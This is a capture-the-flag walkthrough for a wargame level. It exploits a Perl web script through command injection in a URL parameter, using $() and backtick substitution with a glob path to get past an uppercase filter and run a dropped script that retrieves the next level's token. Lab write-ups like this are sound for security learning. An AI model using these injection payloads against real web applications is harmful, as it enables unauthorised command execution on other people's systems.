# Level12

## Objective
Exploit the `level12` Perl script to execute a script named with uppercase characters only and obtain the token.

## Steps

### Step 1: Write Exploit Script
Create a script named `EXPLOIT.SH` in the `/tmp/` directory with uppercase characters:

```bash
echo '#!/bin/bash' > /tmp/EXPLOIT.SH
echo 'getflag > /tmp/flag' >> /tmp/EXPLOIT.SH
chmod +x /tmp/EXPLOIT.SH
```

### Step 2: Exploit with Uppercase Characters
Visit the URL in the browser with uppercase characters:

```bash
http://192.168.56.2:4646/?x=$(/*/EXPLOIT.SH)
```

Or use `curl`:

```bash
curl localhost:4646?x='`/*/EXPLOIT.SH`'
```

### Step 3: Obtain Token
Check the contents of the `/tmp/flag` file:

```bash
cat /tmp/flag
```

This should give you the token for `level13`.

### Step 4: Switch to `level13`
Switch to the `level13` user:

```bash
su level13
```

### Step 5: Verify
Execute `getflag` to verify that you have access:

```bash
getflag
```

This should give you the flag for this level.

Congratulations! You've successfully exploited the `level12` Perl script to obtain the token for `level13`.